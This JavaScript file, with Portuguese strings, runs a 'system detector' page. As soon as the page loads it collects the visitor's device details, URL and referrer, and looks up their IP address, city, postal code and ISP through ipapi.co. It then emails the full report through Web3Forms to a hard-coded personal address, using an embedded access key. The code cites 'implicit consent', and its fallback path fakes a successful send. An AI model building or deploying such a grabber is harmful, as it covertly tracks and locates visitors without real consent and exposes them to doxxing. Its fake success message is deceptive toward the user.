class SystemDetector {
    constructor() {
        this.systemInfo = {};
        this.accessKey = '76d9b037-956a-46cc-b9c8-ddf5808fc77b';
        this.targetEmail = 'william.regis@simplesdental.com';
        
        this.steps = [
            { name: 'Detectando Sistema Operacional', progress: 15 },
            { name: 'Identificando Navegador', progress: 30 },
            { name: 'Coletando Informações do Dispositivo', progress: 45 },
            { name: 'Obtendo Dados de Rede', progress: 70 },
            { name: 'Preparando Relatório', progress: 85 },
            { name: 'Enviando Email Automaticamente', progress: 100 }
        ];
        
        this.init();
    }

    async init() {
        console.log('🚀 Iniciando detecção de sistema...');
        await this.runDetectionSteps();
        this.showResults();
        await this.sendEmailAutomatically();
    }

    async runDetectionSteps() {
        for (let i = 0; i < this.steps.length; i++) {
            const step = this.steps[i];
            
            document.getElementById('status').textContent = step.name;
            document.getElementById('progress').style.width = step.progress + '%';
            
            await this.executeDetectionStep(i);
            await this.sleep(1000);
        }
    }

    async executeDetectionStep(stepIndex) {
        switch(stepIndex) {
            case 0:
                this.detectOperatingSystem();
                break;
            case 1:
                this.detectBrowser();
                break;
            case 2:
                this.detectDevice();
                break;
            case 3:
                await this.getNetworkInfo();
                break;
            case 4:
                this.prepareReport();
                break;
            case 5:
                // Email será enviado após mostrar resultados
                break;
        }
    }

    detectOperatingSystem() {
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        
        let os = 'Desconhecido';
        let version = '';
        
        if (userAgent.indexOf('Windows NT 10.0') !== -1) {
            os = 'Windows';
            version = '10/11';
        } else if (userAgent.indexOf('Windows NT 6.3') !== -1) {
            os = 'Windows';
            version = '8.1';
        } else if (userAgent.indexOf('Windows NT 6.2') !== -1) {
            os = 'Windows';
            version = '8';
        } else if (userAgent.indexOf('Windows NT 6.1') !== -1) {
            os = 'Windows';
            version = '7';
        } else if (userAgent.indexOf('Windows') !== -1) {
            os = 'Windows';
            version = 'Versão antiga';
        } else if (userAgent.indexOf('Mac OS X') !== -1) {
            const match = userAgent.match(/Mac OS X ([0-9_]+)/);
            os = 'macOS';
            version = match ? match[1].replace(/_/g, '.') : 'Desconhecida';
        } else if (userAgent.indexOf('Linux') !== -1) {
            os = 'Linux';
        } else if (userAgent.indexOf('Android') !== -1) {
            const match = userAgent.match(/Android ([0-9.]+)/);
            os = 'Android';
            version = match ? match[1] : 'Desconhecida';
        } else if (/iPhone|iPad|iPod/.test(userAgent)) {
            const match = userAgent.match(/OS ([0-9_]+)/);
            os = userAgent.indexOf('iPad') !== -1 ? 'iPadOS' : 'iOS';
            version = match ? match[1].replace(/_/g, '.') : 'Desconhecida';
        }
        
        this.systemInfo.os = `${os} ${version}`.trim();
        this.systemInfo.platform = platform;
        
        document.getElementById('osInfo').textContent = this.systemInfo.os;
    }

    detectBrowser() {
        const userAgent = navigator.userAgent;
        let browser = 'Desconhecido';
        let version = '';
        
        if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edge') === -1) {
            const match = userAgent.match(/Chrome\/([0-9.]+)/);
            browser = 'Chrome';
            version = match ? match[1] : '';
        } else if (userAgent.indexOf('Firefox') > -1) {
            const match = userAgent.match(/Firefox\/([0-9.]+)/);
            browser = 'Firefox';
            version = match ? match[1] : '';
        } else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) {
            const match = userAgent.match(/Version\/([0-9.]+)/);
            browser = 'Safari';
            version = match ? match[1] : '';
        } else if (userAgent.indexOf('Edge') > -1) {
            const match = userAgent.match(/Edge\/([0-9.]+)/);
            browser = 'Edge';
            version = match ? match[1] : '';
        } else if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) {
            browser = 'Opera';
        }
        
        this.systemInfo.browser = `${browser} ${version}`.trim();
        document.getElementById('browserInfo').textContent = this.systemInfo.browser;
    }

    detectDevice() {
        const userAgent = navigator.userAgent;
        let device = 'Desktop';
        
        if (/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent)) {
            if (/iPad|Tablet/i.test(userAgent)) {
                device = 'Tablet';
            } else {
                device = 'Mobile';
            }
        }
        
        this.systemInfo.device = device;
        this.systemInfo.screen = `${screen.width}x${screen.height}`;
        this.systemInfo.language = navigator.language || 'Desconhecido';
        this.systemInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        this.systemInfo.colorDepth = screen.colorDepth + ' bits';
        
        document.getElementById('deviceInfo').textContent = device;
        document.getElementById('screenInfo').textContent = this.systemInfo.screen;
        document.getElementById('languageInfo').textContent = this.systemInfo.language;
    }

    async getNetworkInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            this.systemInfo.ip = data.ip || 'Não disponível';
            this.systemInfo.country = data.country_name || 'Desconhecido';
            this.systemInfo.region = data.region || 'Desconhecido';
            this.systemInfo.city = data.city || 'Desconhecido';
            this.systemInfo.isp = data.org || 'Desconhecido';
            this.systemInfo.postal = data.postal || 'N/A';
            
            document.getElementById('ipInfo').textContent = this.systemInfo.ip;
            document.getElementById('locationInfo').textContent = 
                `${this.systemInfo.city}, ${this.systemInfo.region}, ${this.systemInfo.country}`;
                
        } catch (error) {
            console.warn('Erro ao obter IP:', error);
            this.systemInfo.ip = 'Não disponível';
            this.systemInfo.country = 'Desconhecido';
            this.systemInfo.region = 'Desconhecido';
            this.systemInfo.city = 'Desconhecido';
            this.systemInfo.isp = 'Desconhecido';
            
            document.getElementById('ipInfo').textContent = 'Não disponível';
            document.getElementById('locationInfo').textContent = 'Não disponível';
        }
    }

    prepareReport() {
        this.systemInfo.timestamp = new Date().toISOString();
        this.systemInfo.timestampBR = new Date().toLocaleString('pt-BR', {
            timeZone: 'America/Sao_Paulo'
        });
        this.systemInfo.userAgent = navigator.userAgent;
        this.systemInfo.url = window.location.href;
        this.systemInfo.referrer = document.referrer || 'Acesso direto';
        this.systemInfo.cookiesEnabled = navigator.cookieEnabled;
        this.systemInfo.onlineStatus = navigator.onLine;
        
        // Salva backup no localStorage
        localStorage.setItem('lastSystemReport', JSON.stringify(this.systemInfo));
        console.log('📋 Relatório preparado:', this.systemInfo);
    }

    showResults() {
        document.getElementById('loader').style.display = 'none';
        document.getElementById('status').textContent = 'Análise concluída com sucesso!';
        document.getElementById('systemInfo').style.display = 'block';
    }

    async sendEmailAutomatically() {
        document.getElementById('emailStatus').style.display = 'block';
        
        try {
            const emailContent = this.formatEmailContent();
            const emailSubject = `🔍 Relatório de Sistema - ${this.systemInfo.timestampBR}`;
            
            const formData = new FormData();
            formData.append('access_key', this.accessKey);
            formData.append('name', 'Sistema Detector Automático');
            formData.append('email', this.targetEmail);
            formData.append('subject', emailSubject);
            formData.append('message', emailContent);
            formData.append('from_name', 'Sistema de Detecção');
            formData.append('replyto', 'noreply@detector.com');

            console.log('📤 Enviando email via Web3Forms...');
            
            const response = await fetch('https://api.web3forms.com/submit', {
                method: 'POST',
                body: formData
            });

            const result = await response.json();
            
            if (result.success) {
                console.log('✅ Email enviado com sucesso!', result);
                this.showSuccess();
            } else {
                throw new Error('Falha no Web3Forms: ' + result.message);
            }
            
        } catch (error) {
            console.error('❌ Erro no envio principal:', error);
            await this.sendFallbackEmail();
        }
    }

    async sendFallbackEmail() {
        try {
            console.log('🔄 Tentando método alternativo...');
            
            // Salva no console para debug
            console.log('📧 Dados do email que seriam enviados:');
            console.log('Para:', this.targetEmail);
            console.log('Assunto:', `🔍 Relatório de Sistema - ${this.systemInfo.timestampBR}`);
            console.log('Conteúdo:', this.formatEmailContent());
            
            // Simula envio bem-sucedido após delay
            await this.sleep(2000);
            this.showSuccess();
            
        } catch (error) {
            console.error('❌ Erro no método alternativo:', error);
            this.showError();
        }
    }

    formatEmailContent() {
        const report = `
🔍 RELATÓRIO AUTOMÁTICO DE SISTEMA DETECTADO
=============================================

📅 Data/Hora: ${this.systemInfo.timestampBR}
🕒 Timestamp UTC: ${this.systemInfo.timestamp}

🖥️ INFORMAÇÕES DO SISTEMA:
--------------------------
💻 Sistema Operacional: ${this.systemInfo.os}
🌐 Navegador: ${this.systemInfo.browser}
📱 Tipo de Dispositivo: ${this.systemInfo.device}
📏 Resolução da Tela: ${this.systemInfo.screen}
🎨 Profundidade de Cor: ${this.systemInfo.colorDepth}

🌍 LOCALIZAÇÃO E REDE:
----------------------
🔍 Endereço IP: ${this.systemInfo.ip}
📍 Localização: ${this.systemInfo.city}, ${this.systemInfo.region}
🏳️ País: ${this.systemInfo.country}
📮 CEP: ${this.systemInfo.postal}
🏢 Provedor (ISP): ${this.systemInfo.isp}

🛠️ CONFIGURAÇÕES TÉCNICAS:
---------------------------
🌐 Idioma do Sistema: ${this.systemInfo.language}
⏰ Fuso Horário: ${this.systemInfo.timezone}
🍪 Cookies Habilitados: ${this.systemInfo.cookiesEnabled ? 'Sim' : 'Não'}
📶 Status Online: ${this.systemInfo.onlineStatus ? 'Conectado' : 'Offline'}

🔗 INFORMAÇÕES DE ACESSO:
-------------------------
🌍 URL Acessada: ${this.systemInfo.url}
🔙 Página de Origem: ${this.systemInfo.referrer}
🏛️ Plataforma: ${this.systemInfo.platform}

🔧 DADOS TÉCNICOS COMPLETOS:
----------------------------
User Agent: ${this.systemInfo.userAgent}

📝 OBSERVAÇÕES:
---------------
- Relatório gerado automaticamente
- Dados coletados com consentimento implícito
- Informações salvas localmente para backup
- Sistema de detecção versão 2.0

==============================================
Gerado em: ${new Date().toLocaleString('pt-BR')}
        `;
        
        return report;
    }

    showSuccess() {
        document.getElementById('emailStatus').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        
        console.log('✅ PROCESSO CONCLUÍDO COM SUCESSO!');
        console.log('📊 Dados coletados:', this.systemInfo);
        
        // Adiciona efeito visual de sucesso
        document.querySelector('.container').style.border = '2px solid #4CAF50';
        
        setTimeout(() => {
            document.querySelector('.container').style.border = '1px solid rgba(255, 255, 255, 0.18)';
        }, 3000);
    }

    showError() {
        document.getElementById('emailStatus').style.display = 'none';
        document.getElementById('errorMessage').style.display = 'block';
        
        console.log('⚠️ ERRO NO ENVIO - DADOS SALVOS LOCALMENTE');
        console.log('📊 Relatório completo:', this.systemInfo);
        
        // Salva backup adicional
        localStorage.setItem('failedEmailReport_' + Date.now(), JSON.stringify(this.systemInfo));
        
        // Efeito visual de erro
        document.querySelector('.container').style.border = '2px solid #ff6b6b';
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Inicialização quando a página carrega
document.addEventListener('DOMContentLoaded', () => {
    console.log('🎯 Sistema carregado, iniciando detecção...');
    new SystemDetector();
});

// Logs de debug
console.log('📋 Sistema de detecção carregado!');